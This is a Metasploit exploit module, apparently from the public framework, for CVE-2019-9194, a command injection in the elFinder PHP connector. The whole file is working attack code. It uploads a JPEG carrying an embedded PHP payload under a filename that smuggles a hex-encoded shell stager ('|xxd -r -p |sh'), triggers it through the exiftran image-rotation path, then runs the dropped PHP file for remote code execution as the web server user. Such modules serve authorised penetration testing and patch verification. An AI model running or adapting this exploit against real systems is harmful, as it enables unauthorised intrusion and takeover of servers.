# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;elFinder PHP Connector exiftran Command Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a command injection vulnerability in elFinder
        versions prior to 2.1.48.

        The PHP connector component allows unauthenticated users to upload
        files and perform file modification operations, such as resizing and
        rotation of an image. The file name of uploaded files is not validated,
        allowing shell metacharacters.

        When performing image operations on JPEG files, the filename is passed
        to the `exiftran` utility without appropriate sanitization, causing
        shell commands in the file name to be executed, resulting in remote
        command injection as the web server user.

        The PHP connector is not enabled by default.

        The system must have `exiftran` installed and in `$PATH`.

        This module has been tested successfully on elFinder versions 2.1.47,
        2.1.20 and 2.1.16 on Ubuntu.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Thomas Chauchefoin&#039;, # Discovery
          &#039;q3rv0&#039;,              # Exploit
          &#039;bcoles&#039;              # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-9194&#039;],
          [&#039;EDB&#039;, &#039;46481&#039;],
          [&#039;URL&#039;, &#039;https://github.com/Studio-42/elFinder/releases/tag/2.1.48&#039;],
          [&#039;URL&#039;, &#039;https://www.secsignal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/&#039;]
        ],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Targets&#039;        => [[&#039;Auto&#039;, {}]],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;2019-02-26&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options [
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to elFinder&#039;, &#039;/elFinder/&#039;])
    ]
  end

  #
  # Check if /php/connector.minimal.php exists and is executable
  #
  def check
    uri = normalize_uri(target_uri.path, &#039;php&#039;, &#039;connector.minimal.php&#039;)
    res = send_request_cgi(&#039;uri&#039; => uri)

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    unless res.code == 200
      vprint_status "#{uri} does not exist"
      return CheckCode::Safe
    end

    if res.body.include? &#039;<?php&#039;
      vprint_status &#039;PHP is not enabled&#039;
      return CheckCode::Safe
    end

    CheckCode::Detected
  end

  #
  # Upload PHP payload
  #
  def upload(fname)
    # Small JPEG file from:
    # https://github.com/mathiasbynens/small/blob/master/jpeg.jpg
    jpeg = %w[
      FF D8 FF DB 00 43 00 03 02 02 02 02 02 03 02 02
      02 03 03 03 03 04 06 04 04 04 04 04 08 06 06 05
      06 09 08 0A 0A 09 08 09 09 0A 0C 0F 0C 0A 0B 0E
      0B 09 09 0D 11 0D 0E 0F 10 10 11 10 0A 0C 12 13
      12 10 13 0F 10 10 10 FF C9 00 0B 08 00 01 00 01
      01 01 11 00 FF CC 00 06 00 10 10 05 FF DA 00 08
      01 01 00 00 3F 00 D2 CF 20 FF D9
    ]
    jpeg = [jpeg.join].pack(&#039;H*&#039;)
    jpeg << rand_text_alphanumeric(50..100)
    jpeg << "<?php #{payload.encoded} ?>"
    jpeg << rand_text_alphanumeric(50..100)

    data = Rex::MIME::Message.new
    data.add_part(&#039;upload&#039;, nil, nil, &#039;form-data; name="cmd"&#039;)
    data.add_part(&#039;l1_Lw&#039;, nil, nil, &#039;form-data; name="target"&#039;)
    data.add_part(jpeg, &#039;image/jpeg&#039;, nil, %(form-data; name="upload[]"; filename="#{fname}"))
    post_data = data.to_s

    print_status("Uploading payload &#039;#{fname}&#039; (#{post_data.length} bytes)")

    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;php&#039;, &#039;connector.minimal.php&#039;),
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;   => post_data
    )

    unless res
      fail_with Failure::Unreachable, &#039;Connection failed&#039;
    end

    unless res.code == 200
      fail_with Failure::UnexpectedReply, &#039;Unexpected reply&#039;
    end

    unless res.body.include?(&#039;"added"&#039;)
      fail_with Failure::UnexpectedReply, "Upload failed: #{res.body}"
    end

    if res.body.include?(&#039;"error"&#039;) || res.body.include?(&#039;"warning"&#039;)
      fail_with Failure::UnexpectedReply, "Upload failed: #{res.body}"
    end

    json_res = JSON.parse(res.body) rescue nil

    if json_res.nil? || json_res[&#039;added&#039;].empty?
      fail_with Failure::UnexpectedReply, "Upload failed: #{res.body}"
    end

    json_res[&#039;added&#039;].first[&#039;hash&#039;] || &#039;&#039;
  end

  #
  # Trigger the command injection via image rotation functionality
  # Rotates image by 180 degrees to trigger `exiftran` code path
  #
  def trigger(hash)
    print_status &#039;Triggering vulnerability via image rotation ...&#039;

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;php&#039;, &#039;connector.minimal.php&#039;),
      &#039;vars_get&#039; => {
        &#039;target&#039; => hash,
        &#039;degree&#039; => &#039;180&#039;,
        &#039;mode&#039;   => &#039;rotate&#039;,
        &#039;cmd&#039;    => &#039;resize&#039;
      }
    }, 5)

    unless res
      fail_with Failure::Unreachable, &#039;Connection failed&#039;
    end

    if res.body.include?(&#039;"error"&#039;) || res.body.include?(&#039;"warning"&#039;)
      fail_with Failure::UnexpectedReply, "Image rotate failed: #{res.body}"
    end
  end

  #
  # Delete uploaded file
  #
  def delete_file(hash)
    print_status &#039;Removing uploaded file ...&#039;

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;php&#039;, &#039;connector.minimal.php&#039;),
      &#039;vars_get&#039; => {
        &#039;cmd&#039; => &#039;rm&#039;,
        &#039;targets[]&#039; => hash
      }
    }, 15)

    unless res
      print_status &#039;Connection failed&#039;
      return
    end

    if res.body.include?(&#039;errFileNotFound&#039;)
      print_error "Could not delete uploaded file. Unexpected reply: #{res.body}"
      return
    end

    print_good &#039;Deleted uploaded file&#039;
  end

  #
  # Execute payload
  #
  def execute_payload(php_fname)
    path = normalize_uri(target_uri.path, &#039;php&#039;, php_fname)

    print_status "Executing payload (#{path}) ..."

    res = send_request_cgi({
      &#039;uri&#039; => path
    }, 15)

    unless res
      print_status &#039;No reply&#039;
      return
    end

    unless res.code == 200
      fail_with Failure::UnexpectedReply, "Executing payload failed (HTTP #{res.code})"
    end
  end

  #
  # Remove uploaded file
  #
  def cleanup
    delete_file @hash unless @hash.nil?
  ensure
    super
  end

  #
  # upload && execute
  #
  def exploit
    unless check == CheckCode::Detected
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end

    fname = rand_text_alphanumeric(6..10)
    php_fname = ".#{rand_text_alphanumeric(6..10)}.php"

    # Max file name length is ~250 characters
    # and characters such as `/` are forbidden.
    # Hex encoded stager copies the uploaded file from the `files` directory
    # to the working directory (`php`) and changes the extension to `.php`
    # The stager is decoded with xxd when the vuln is triggered.
    stager = "cp ../files/#{fname}.jpg*echo* #{php_fname}"

    # Upload our payload jpg file with encoded stager in the filename
    jpg_fname = "#{fname}.jpg;echo #{stager.unpack(&#039;H*&#039;).flatten.first} |xxd -r -p |sh& #.jpg"
    @hash = upload jpg_fname

    if @hash.to_s == &#039;&#039;
      fail_with Failure::Unknown, &#039;Upload failed: Failed to retrieve file hash ID&#039;
    end

    trigger @hash

    register_file_for_cleanup php_fname

    execute_payload php_fname
  end
end

